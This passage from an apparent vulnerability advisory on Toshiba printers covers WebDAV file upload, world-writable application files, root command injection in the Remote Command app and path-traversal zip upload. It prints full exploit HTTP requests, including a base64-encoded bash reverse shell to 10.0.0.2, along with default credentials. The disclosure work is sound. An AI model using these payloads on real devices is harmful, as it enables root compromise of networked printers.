EXEC    txt     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.txt
EXEC    txt     FAIL
EXEC    cfm     FAIL
EXEC    pl      FAIL
EXEC    shtml   FAIL
EXEC    php     FAIL
EXEC    jsp     FAIL
EXEC    cgi     FAIL
EXEC    html    SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.html
EXEC    html    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.aspx
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.asp
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.jhtml
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.txt
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.cfm
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.pl
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.shtml
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.php
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.jsp
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.cgi
PUT File: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.html
Executes: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.txt
Executes: http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.html
kali%
</code></pre>
<p>We can confirm the files are stored inside the printer:     </p>
<pre><code>bash-4.1# ls -la /storage/box/EFilingBoxes/
total 16
drwxrwxrwx 4 root   root    4096 Mar  9 03:22 .
drwxr-xr-x 9 root   root    4096 Mar  9 01:47 ..
drwxrwxrwx 2 root   trusted 4096 Aug 12  2018 00000
drwxrwxrwx 2 apache trusted 4096 Mar  9 03:22 DavTestDir_SIX4x_ZkORvv
-rwxrwxrwx 1 root   trusted    0 Mar  9 01:47 initialized.sts
bash-4.1# ls -la /storage/box/EFilingBoxes/DavTestDir_SIX4x_ZkORvv
total 52
drwxrwxrwx 2 apache trusted 4096 Mar  9 03:22 .
drwxrwxrwx 4 root   root    4096 Mar  9 03:22 ..
-rw-rw-rw- 1 apache trusted   44 Mar  9 03:22 davtest_SIX4x_ZkORvv.asp
-rw-rw-rw- 1 apache trusted   44 Mar  9 03:22 davtest_SIX4x_ZkORvv.aspx
-rw-rw-rw- 1 apache trusted   42 Mar  9 03:22 davtest_SIX4x_ZkORvv.cfm
-rw-rw-rw- 1 apache trusted   66 Mar  9 03:22 davtest_SIX4x_ZkORvv.cgi
-rw-rw-rw- 1 apache trusted   26 Mar  9 03:22 davtest_SIX4x_ZkORvv.html
-rw-rw-rw- 1 apache trusted   37 Mar  9 03:22 davtest_SIX4x_ZkORvv.jhtml
-rw-rw-rw- 1 apache trusted   37 Mar  9 03:22 davtest_SIX4x_ZkORvv.jsp
-rw-rw-rw- 1 apache trusted   24 Mar  9 03:22 davtest_SIX4x_ZkORvv.php
-rw-rw-rw- 1 apache trusted   66 Mar  9 03:22 davtest_SIX4x_ZkORvv.pl
-rw-rw-rw- 1 apache trusted  181 Mar  9 03:22 davtest_SIX4x_ZkORvv.shtml
-rw-rw-rw- 1 apache trusted   19 Mar  9 03:22 davtest_SIX4x_ZkORvv.txt
bash-4.1#
</code></pre>
<p>A remote attacker can store files that will contain XSS in the printer web interface.</p>
<p>This vulnerability has been patched in the latest firmware version since the new version of Apache has some changes in the configuration options (the <code>require valid-user</code> option).</p>
<h2>Target: Toshiba Printers - Embedded applications</h2>
<h2>Summary</h2>
<p>The Toshiba printers support additional programs ("embedded applications") in the latest version of the firmware images.</p>
<p>By default, 2 programs are installed:</p>
<ul>
<li>Remote Command (v1.0.8)</li>
<li>Cloud Authentication for email (v1.0.0).</li>
</ul>
<p>Listing of applications installed by default:</p>
<p><img alt="" src="images/2024-toshiba-application-list.png" /></p>
<p><a href="images/2024-toshiba-application-list-full.png">Click here for full image</a></p>
<p>It is possible to interact with such applications as shown below:</p>
<p><img alt="" src="images/2024-toshiba-application-remote-cmd.png" /></p>
<p><a href="images/2024-toshiba-application-remote-cmd-full.png">Click here for full image</a></p>
<p><a id="insecure-permissions"></a></p>
<h2>Details - Insecure permissions</h2>
<p>It was observed that the programs are located inside the /application directory:</p>
<p>Content of <code>/application</code>:</p>
<pre><code>bash-4.1# cd /application
bash-4.1# ls -la
total 44
drwxr-xr-x  8 root root     4096 Mar 15 11:49 .
drwxr-xr-x 30 root root     4096 Apr 10 18:47 ..
drwxr-xr-x  4 root root     4096 Mar 15 11:50 app
drwxrwxrwx  4 root trusted  4096 Mar 15 11:49 backup
drwx--x---  3 root trusted  4096 Apr  6  2016 common
drwxr-xr-x  5 root root     4096 Apr  6  2016 framework
drwx------  2 root root    16384 Apr  6  2016 lost+found
drwxr-xr-x  7 root root     4096 Apr  6  2016 webframework
bash-4.1#
</code></pre>
<p>When analyzing the directories inside /application, we can find several insecure permissions.</p>
<p>The backup directory is insecure, with incorrect (777) permissions everywhere:</p>
<p>Content of <code>/application/backup</code>:</p>
<pre><code>bash-4.1# pwd
/application/backup 
bash-4.1#  
bash-4.1# ls -la
total 16
drwxrwxrwx 4 root trusted 4096 Mar 15 11:49 .
drwxr-xr-x 8 root root    4096 Mar 15 11:49 ..
drwxrwxrwx 4 root trusted 4096 Mar 15 11:50 initial
drwxrwxrwx 4 root trusted 4096 Mar 15 11:50 latest
bash-4.1# ls -latrR 
.:
total 16
drwxr-xr-x 8 root root    4096 Mar 15 11:49 ..
drwxrwxrwx 4 root trusted 4096 Mar 15 11:49 .
drwxrwxrwx 4 root trusted 4096 Mar 15 11:50 initial
drwxrwxrwx 4 root trusted 4096 Mar 15 11:50 latest

./initial:
total 16
drwxrwxrwx 2 apache trusted 4096 Mar 15 11:49 10000000-0000-0000-0000-500000000000
drwxrwxrwx 4 root   trusted 4096 Mar 15 11:49 ..
drwxrwxrwx 2 apache trusted 4096 Mar 15 11:50 10000000-0000-0000-0000-500000000001
drwxrwxrwx 4 root   trusted 4096 Mar 15 11:50 .

./initial/10000000-0000-0000-0000-500000000000:
total 184
drwxrwxrwx 2 apache trusted   4096 Mar 15 11:49 .
-rwxrwxrwx 1 apache trusted 176778 Mar 15 11:49 apppackage.zip
drwxrwxrwx 4 root   trusted   4096 Mar 15 11:50 ..

./initial/10000000-0000-0000-0000-500000000001:
total 256
drwxrwxrwx 4 root   trusted   4096 Mar 15 11:50 ..
drwxrwxrwx 2 apache trusted   4096 Mar 15 11:50 .
-rwxrwxrwx 1 apache trusted 250054 Mar 15 11:50 apppackage.zip

./latest:
total 16
drwxrwxrwx 4 root   trusted 4096 Mar 15 11:49 ..
drwxrwxrwx 2 apache trusted 4096 Mar 15 11:49 10000000-0000-0000-0000-500000000000
drwxrwxrwx 2 apache trusted 4096 Mar 15 11:50 10000000-0000-0000-0000-500000000001
drwxrwxrwx 4 root   trusted 4096 Mar 15 11:50 .

./latest/10000000-0000-0000-0000-500000000000:
total 184
drwxrwxrwx 2 apache trusted   4096 Mar 15 11:49 .
-rwxrwxrwx 1 apache trusted 176778 Mar 15 11:49 apppackage.zip
drwxrwxrwx 4 root   trusted   4096 Mar 15 11:50 ..

./latest/10000000-0000-0000-0000-500000000001:
total 256 
drwxrwxrwx 4 root   trusted   4096 Mar 15 11:50 ..
drwxrwxrwx 2 apache trusted   4096 Mar 15 11:50 .
-rwxrwxrwx 1 apache trusted 250054 Mar 15 11:50 apppackage.zip
</code></pre>
<p>The app directory is also insecure, due to incorrect permissions everywhere:</p>
<p>Content of <code>/application/app</code>:</p>
<pre><code>bash-4.1# pwd
/application/app
bash-4.1# ls -la
total 16
drwxr-xr-x 4 root   root    4096 Mar 15 11:50 .
drwxr-xr-x 8 root   root    4096 Mar 15 11:49 ..
drwx--x--- 6 apache trusted 4096 Apr 10 18:42 10000000-0000-0000-0000-500000000000
drwx--x--- 6 apache trusted 4096 Mar 15 11:50 10000000-0000-0000-0000-500000000001
bash-4.1# ls -la /application/app/10000000-0000-0000-0000-500000000000
total 24
drwx--x--- 6 apache trusted 4096 Apr 10 18:42 . 
drwxr-xr-x 4 root   root    4096 Mar 15 11:50 ..
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 appjob
drwx--x--- 4 apache trusted 4096 Mar 15 11:49 appstorage
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 config
drwx--x--- 7 apache trusted 4096 Mar 15 11:50 package
bash-4.1#
</code></pre>
<p>Analysis of <code>/application/app/10000000-0000-0000-0000-500000000000</code>, with insecure permissions:</p>
<pre><code>10000000-0000-0000-0000-500000000000/package/program/settingapp/server/views:
total 48
drwx--x--- 3 apache trusted 4096 Apr 10 17:42 .
drwx--x--- 5 apache trusted 4096 Apr 10 17:42 ..
-rwxrwxrwx 1 apache trusted   67 Apr 11  2022 __init__.py
drwxrwxrwx 2 apache trusted 4096 Apr 10 17:42 __pycache__
-rwxrwxrwx 1 apache trusted 6334 Apr 11  2022 command.py
-rwxrwxrwx 1 apache trusted 2882 Apr 11  2022 device.py
-rwxrwxrwx 1 apache trusted 1018 Apr 11  2022 history.py
-rwxrwxrwx 1 apache trusted 1144 Apr 11  2022 localization.py
-rwxrwxrwx 1 apache trusted  982 Apr 11  2022 resultstorage.py
-rwxrwxrwx 1 apache trusted 1933 Apr 11  2022 storage.py
-rwxrwxrwx 1 apache trusted 3103 Apr 11  2022 view.py

10000000-0000-0000-0000-500000000000/package/program/settingapp/server/worker:
total 16
drwx--x--- 3 apache trusted 4096 Apr 10 17:42 .
drwx--x--- 5 apache trusted 4096 Apr 10 17:42 ..
drwxrwxrwx 2 apache trusted 4096 Apr 10 17:42 __pycache__
-rwxrwxrwx 1 apache trusted 1892 Apr 11  2022 commandthread.py


package/program/settingapp/server/worker:
total 16
-rwxrwxrwx 1 apache trusted 1892 Apr 11  2022 commandthread.py
drwx--x--- 5 apache trusted 4096 Apr 10 17:42 ..
drwxrwxrwx 2 apache trusted 4096 Apr 10 17:42 __pycache__
drwx--x--- 3 apache trusted 4096 Apr 10 17:42 .

package/program/settingapp/server/worker/__pycache__:
total 12
-rw-rw-rw- 1 apache trusted 1968 Apr 10 17:42 commandthread.cpython-35.pyc
drwx--x--- 3 apache trusted 4096 Apr 10 17:42 ..
drwxrwxrwx 2 apache trusted 4096 Apr 10 17:42 .

package/program/backgroundapp:
total 68
-rwxrwxrwx 1 apache trusted 21409 Apr 11  2022 filefunction.py
-rwxrwxrwx 1 apache trusted  3738 Apr 11  2022 exclusivecontrol.py
-rwxrwxrwx 1 apache trusted 24233 Apr 11  2022 eventhandler.py
-rwxrwxrwx 1 apache trusted  1326 Apr 11  2022 backgroundapp.py
drwx--x--- 5 apache trusted  4096 Mar 15 11:49 ..
drwx--x--- 3 apache trusted  4096 Mar 15 11:50 .
drwxrwxrwx 2 root   trusted  4096 Mar 15 11:50 __pycache__
</code></pre>
<p>By default, the applications are stored inside <code>/application/app</code>.</p>
<p>We can confirm that the Python scripts have insecure permissions, allowing any local user to overwrite them and get a Local Privilege Escalation.</p>
<p>A remote attacker using the insecure upload functionality will be able to overwrite any Python file and get Remote Code Execution.</p>
<p>A local attacker can overwrite any file.</p>
<p><a id="rce-command-injection"></a></p>
<h2>Details - Remote Code Execution - command injection as root</h2>
<p>It was observed that the Remote Command program allows an attacker to get Remote Code Execution as root.</p>
<p>When uploading a file with the fileName <code>|id</code>, the command <code>id</code> will be executed as root on the printer. There is a command injection inside the <code>fileName</code> variable:</p>
<p><img alt="" src="images/2024-toshiba-application-remote-cmd-rce-01.png" /></p>
<p><a href="images/2024-toshiba-application-remote-cmd-rce-01-full.png">Click here for full image</a></p>
<p>The HTTP request is:</p>
<pre><code>POST /aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/execute HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 32
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/aplpx/client/10000000-0000-0000-0000-500000000000/index.html?v=1.0.8
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DAPPLICATION%26CAT%3DAPPLINK; clicked=0; TopAccessURL=http%3A//10.0.0.1%3A8080/%3FMAIN%3DTOPACCESS; lastVisited=APPLINK; SessionID=Session_02b918cd-3074-4f4f-afd6-396ed3fb7f94; IgnoreSessionTimeout=1; Session=10.0.0.2.c57914f5d5c3263959918454856ac9f3

{"file":"test","fileName":"|id"}
</code></pre>
<p>And the command <code>id</code> will be executed as root on the printer:</p>
<pre>
2023/04/10 18:16:07 CMD: UID=0     PID=10794  | sh -c chmod 666 /application/app/10000000-0000-0000-0000-500000000000/appstorage/normal//remotecommand//test3.test|id
<font color=red>2023/04/10 18:16:07 CMD: UID=0     PID=10796  | id</font>
2023/04/10 18:16:07 CMD: UID=0     PID=10795  | chmod 666 /application/app/10000000-0000-0000-0000-500000000000/appstorage/normal//remotecommand//test3.test
</pre>

<p>A PoC is provided, allowing getting a connect-back shell as root:</p>
<p><img alt="" src="images/2024-toshiba-application-remote-cmd-rce-02.png" /></p>
<p><a href="images/2024-toshiba-application-remote-cmd-rce-02-full.png">Click here for full image</a></p>
<p>The HTTP request is:</p>
<pre><code>POST /aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/execute HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 345
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/aplpx/client/10000000-0000-0000-0000-500000000000/index.html?v=1.0.8
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DAPPLICATION%26CAT%3DAPPLINK; clicked=0; TopAccessURL=http%3A//10.0.0.1%3A8080/%3FMAIN%3DTOPACCESS; lastVisited=APPLINK; SessionID=Session_02b918cd-3074-4f4f-afd6-396ed3fb7f94; IgnoreSessionTimeout=1; Session=10.0.0.2.c57914f5d5c3263959918454856ac9f3

{"file":"UEsDBAoAAAAAAEMyilbGNbk7BQAAAAUAAAAIABwAdGVzdC50eHRVVAkAA13iM2Tu/TNkdXgLAAEE6AMAAAToAwAAdGVzdApQSwECHgMKAAAAAABDMopWxjW5OwUAAAAFAAAACAAYAAAAAAABAAAAgIEAAAAAdGVzdC50eHRVVAUAA13iM2R1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAARwAAAAAA","fileName":"test-exec.zip$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMi84MCAwPiYxCg==|base64 -d|bash)"}
</code></pre>
<p>The malicious payload is generated using base64 to remove bad characters. It is a standard connect-back shell, connecting to 10.0.0.2 to port 80 over TCP:</p>
<pre><code>kali% echo 'bash -i &gt;&amp; /dev/tcp/10.0.0.2/80 0&gt;&amp;1' | base64 -w0;echo
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMi84MCAwPiYxCg==
</code></pre>
<p>The resulting command is executed on the printer:</p>
<pre><code>root     13040  0.0  0.1  13260  2344 ?        S    18:50   0:00 sh -c chmod 666 /application/app/10000000-0000-0000-0000-500000000000/appstorage/normal//remotecommand//test-exec.zip$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMi84MCAwPiYxCg==|base64 -d|bash)
</code></pre>
<p>And we can confirm the command was executed from Python, from the parent processus alappmanager:</p>
<pre>
bash-4.1# pstree
init-+-MemoryCaptureSt---MemoryCapture---sleep
     |-aleSCL
     |-alhp9100---21*[{alhp9100}]
     |-2*[alipp---2*[{alipp}]]
     |-allld2d
     |-alllmnr
     |-allprng---21*[{allprng}]
     |-alnetefiRemotei
     |-alstage2-+-alstage2
     |          `-23*[{alstage2}]
     |-alusbPrint---2*[{alusbPrint}]
     |-alwsdiscovery
     |-alwsmex
     |-alwsprint---{alwsprint}
     |-alwsscanner---3*[{alwsscanner}]
     |-bash---pspy32---9*[{pspy32}]
     |-cissm-+-alAddressBookMg
     |       |-alCloning
     |       |-alExportImport
     |       |-alLogRetriever
     |       |-alLogmanager---{alLogmanager}
     |       |-alPanelStartLED---{alPanelStartLE}
     |       |-alPanelUIMessag---{alPanelUIMessa}
     |       |-alServiceUIPlug
     |       |-alUiFrameWork---21*[{alUiFrameWork}]
     |       |-alViewPlugin---3*[{alViewPlugin}]
     |       |-alaccountmgr---2*[{alaccountmgr}]
<font color=red>     |       |-alappmanager-+-python-+-sh---sh---bash---bash---pstree</font>
     |       |              |        `-5*[{python}]
     |       |              |-python---5*[{python}]
     |       |              `-15*[{alappmanager}]
[...]
</pre>

<p>The vulnerable code is located in the <code>/application/app/10000000-0000-0000-0000-500000000000/package/program/settingapp/server/views/command.py</code> Python script, with sources on lines 34 and 59:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  <span style="color: #666666">1</span> <span style="color: #408080; font-style: italic">#!/usr/bin/env python</span>
  <span style="color: #666666">2</span> <span style="color: #408080; font-style: italic"># -*- coding: utf-8 -*-</span>
  <span style="color: #666666">3</span> <span style="color: #408080; font-style: italic"># Copyright(c) 2021 Toshiba Tec Corporation, All Rights Reserved.</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">23</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">CommandView</span>(View):
 <span style="color: #666666">24</span>
 <span style="color: #666666">25</span>     <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span>View<span style="color: #666666">.</span>BASE_ROUTE_NAME <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;upload_command_file&#39;</span>, request_method<span style="color: #666666">=</span><span style="color: #BA2121">&#39;POST&#39;</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;json&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">26</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_command_file</span>(<span style="color: #008000">self</span>):
 <span style="color: #666666">27</span>         Logger<span style="color: #666666">.</span>i(<span style="color: #BA2121">&quot;start upload command file to appstorage&quot;</span>)
[<span style="color: #666666">...</span>]
 <span style="color: #666666">30</span>             storage_rootpath <span style="color: #666666">=</span> FileHandler<span style="color: #666666">.</span>getStorageRootPath(storage_type<span style="color: #666666">=</span><span style="color: #BA2121">&quot;normal&quot;</span>)
[<span style="color: #666666">...</span>]
 <span style="color: #666666">33</span>             <span style="color: #408080; font-style: italic"># configure file path that specified using File API</span>
 <span style="color: #666666">34</span>             payloads <span style="color: #666666">=</span> <span style="color: #008000">self</span><span style="color: #666666">.</span>request<span style="color: #666666">.</span>json_body                    [<span style="color: #666666">1</span>] get value <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">attacker</span>
 <span style="color: #666666">35</span>             Logger<span style="color: #666666">.</span>i(<span style="color: #BA2121">&quot;request body: &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(payloads))
[<span style="color: #666666">...</span>]
 <span style="color: #666666">59</span>             commandRunner <span style="color: #666666">=</span> CommandThread(payloads[<span style="color: #BA2121">&quot;fileName&quot;</span>])  [<span style="color: #666666">2</span>] execute a commands <span style="color: #008000; font-weight: bold">with</span> the name controlled by the attacker
 <span style="color: #666666">60</span>             commandthread <span style="color: #666666">=</span> eapi<span style="color: #666666">.</span>apps<span style="color: #666666">.</span>AppThread<span style="color: #666666">.</span>create(commandRunner)
 <span style="color: #666666">61</span>             commandthread<span style="color: #666666">.</span>start()
</pre></div>

<p>The <code>CommandThread</code> class is implemented in <code>/application/app/10000000-0000-0000-0000-500000000000/package/program/settingapp/server/worker/commandthread.py</code> and is a wrapper to <code>remoteCommandObj.execute()</code> where we can find the sink:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">33</span>             file_path <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/command/&#39;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(<span style="color: #008000">self</span><span style="color: #666666">.</span>commandName)
 <span style="color: #666666">34</span> 
 <span style="color: #666666">35</span>             remoteCommandObj <span style="color: #666666">=</span> eapi<span style="color: #666666">.</span>apps<span style="color: #666666">.</span>RemoteCommand<span style="color: #666666">.</span>create()
 <span style="color: #666666">36</span>             result <span style="color: #666666">=</span> remoteCommandObj<span style="color: #666666">.</span>execute(eapi<span style="color: #666666">.</span>apps<span style="color: #666666">.</span>AppStorageType<span style="color: #666666">.</span>AppStorageType_Normal, file_path, eapi<span style="color: #666666">.</span>apps<span style="color: #666666">.</span>RemoteCommandUser<span style="color: #666666">.</span>RemoteCommandUser_Admin, <span style="color: #008000">True</span>, result_dir_path)
 <span style="color: #666666">37</span>             <span style="color: #408080; font-style: italic"># Logger.w(str(result))</span>
 <span style="color: #666666">38</span> 
 <span style="color: #666666">39</span>             res_status <span style="color: #666666">=</span> result<span style="color: #666666">.</span>getStatus()
 <span style="color: #666666">40</span>             ExcecutionStatus<span style="color: #666666">.</span>STATUS <span style="color: #666666">=</span> <span style="color: #008000">str</span>(res_status)
 <span style="color: #666666">41</span>             Logger<span style="color: #666666">.</span>w(<span style="color: #BA2121">&quot;command status: &quot;</span> <span style="color: #666666">+</span> ExcecutionStatus<span style="color: #666666">.</span>STATUS)
 <span style="color: #666666">42</span>             command_type <span style="color: #666666">=</span> result<span style="color: #666666">.</span>getType()
 <span style="color: #666666">43</span>             ExcecutionStatus<span style="color: #666666">.</span>COMMANDTYPE <span style="color: #666666">=</span> command_type <span style="color: #666666">=</span> <span style="color: #008000">str</span>(command_type)
 <span style="color: #666666">44</span>             Logger<span style="color: #666666">.</span>w(<span style="color: #BA2121">&quot;command type: &quot;</span> <span style="color: #666666">+</span> ExcecutionStatus<span style="color: #666666">.</span>COMMANDTYPE)
 <span style="color: #666666">45</span>             ExcecutionStatus<span style="color: #666666">.</span>RESULTFILENAME <span style="color: #666666">=</span> result<span style="color: #666666">.</span>getFileName()<span style="color: #666666">.</span>split(<span style="color: #BA2121">&#39;/&#39;</span>)[<span style="color: #666666">-1</span>]
</pre></div>

<p>A remote attacker can get Remote Code Execution as root.</p>
<p><a id="rce-insecure-upload-01"></a></p>
<h2>Details - Remote Code Execution - insecure upload</h2>
<p>It was observed that the Remote Command program allows an attacker to get Remote Code Execution by overwriting existing files (e.g. Python files containing executable code). </p>
<p>The Remote Command application allows uploading documents (as zip files) using the <code>/aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/upload_command_file</code> API. When sending a zip file with the filename <code>../</code>, it is possible to overwrite any file within the directory of the Python application.</p>
<p>By default, when uploading a file through the web interface of the Remote Command application, the file will be copied into 3 different directories:</p>
<ul>
<li><code>/work/al/tmp/remotecommand/</code></li>
<li><code>/application/app/10000000-0000-0000-0000-500000000000/appstorage/normal/command/</code></li>
<li><code>/application/app/10000000-0000-0000-0000-500000000000/appstorage/normal/remotecommand/</code></li>
</ul>
<p>The <code>/application/app/10000000-0000-0000-0000-500000000000/</code> directory corresponds to the Remote Command application which is installed by default.</p>
<p>This <code>/application/app/10000000-0000-0000-0000-500000000000/</code> directory has several directories containing Python scripts:</p>
<pre><code>bash-4.1# pwd
/application/app/10000000-0000-0000-0000-500000000000
bash-4.1# ls -la
total 24
drwx--x--- 6 apache trusted 4096 Apr 10 18:40 .
drwxr-xr-x 4 root   root    4096 Mar 15 11:50 ..
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 appjob
drwx--x--- 4 apache trusted 4096 Mar 15 11:49 appstorage
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 config
drwx--x--- 7 apache trusted 4096 Mar 15 11:50 package
bash-4.1#
</code></pre>
<p>An attacker uploading a zip file with a filename containing <code>../../</code> will be able to overwrite any file in <code>/application/app/10000000-0000-0000-0000-500000000000</code> and in subdirectories of <code>/application/app/10000000-0000-0000-0000-500000000000</code>:</p>
<p>Malicious HTTP request sent to the Remote Command application: </p>
<pre><code>POST /aplpx/server/10000000-0000-0000-0000-500000000000/remotecommand/settingapp/command/upload_command_file HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest 
Content-Length: 278
Origin: http://10.0.0.1:8080 
Connection: close
Referer: http://10.0.0.1:8080/aplpx/client/10000000-0000-0000-0000-500000000000/index.html?v=1.0.8
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DADMIN%26SUB%3DAPPLICATION%26CAT%3DAPPLINK; clicked=0; TopAccessURL=http%3A//10.0.0.1%3A8080/%3FMAIN%3DTOPACCESS; lastVisited=APPLINK; SessionID=Session_02b918cd-3074-4f4f-afd6-396ed3fb7f94; IgnoreSessionTimeout=1; Session=10.0.0.2.c57914f5d5c3263959918454856ac9f3

{"file":"UEsDBAoAAAAAAEMyilbGNbk7BQAAAAUAAAAIABwAdGVzdC50eHRVVAkAA13iM2Tu/TNkdXgLAAEE6AMAAAToAwAAdGVzdApQSwECHgMKAAAAAABDMopWxjW5OwUAAAAFAAAACAAYAAAAAAABAAAAgIEAAAAAdGVzdC50eHRVVAUAA13iM2R1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAARwAAAAAA","fileName":"../../../test-get-cmd.zip"}
</code></pre>
<p>The resulting file is now located in <code>/application/app/10000000-0000-0000-0000-500000000000</code>:</p>
<pre><code>bash-4.1# ls -la /application/app/10000000-0000-0000-0000-500000000000
total 28
drwx--x--- 6 apache trusted 4096 Apr 10 18:41 .
drwxr-xr-x 4 root   root    4096 Mar 15 11:50 ..
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 appjob
drwx--x--- 4 apache trusted 4096 Mar 15 11:49 appstorage
drwx--x--- 2 apache trusted 4096 Mar 15 11:49 config
drwx--x--- 7 apache trusted 4096 Mar 15 11:50 package
-rw-rw-rw- 1 apache trusted  171 Apr 10 18:41 test-get-cmd.zip
bash-4.1#
</code></pre>
<p>An attacker can overwrite any Python file in the Remote Execution application (in <code>/application/app/10000000-0000-0000-0000-500000000000</code>) to get Remote Code Execution.</p>
<p>The vulnerable code is located in the <code>/application/app/10000000-0000-0000-0000-500000000000/package/program/settingapp/server/views/command.py</code> Python script:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  <span style="color: #666666">1</span> <span style="color: #408080; font-style: italic">#!/usr/bin/env python</span>
  <span style="color: #666666">2</span> <span style="color: #408080; font-style: italic"># -*- coding: utf-8 -*-</span>
  <span style="color: #666666">3</span> <span style="color: #408080; font-style: italic"># Copyright(c) 2021 Toshiba Tec Corporation, All Rights Reserved.</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">23</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">CommandView</span>(View):
 <span style="color: #666666">24</span>
 <span style="color: #666666">25</span>     <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span>View<span style="color: #666666">.</span>BASE_ROUTE_NAME <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;upload_command_file&#39;</span>, request_method<span style="color: #666666">=</span><span style="color: #BA2121">&#39;POST&#39;</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;json&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">26</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_command_file</span>(<span style="color: #008000">self</span>):
 <span style="color: #666666">27</span>         Logger<span style="color: #666666">.</span>i(<span style="color: #BA2121">&quot;start upload command file to appstorage&quot;</span>)
[<span style="color: #666666">...</span>]
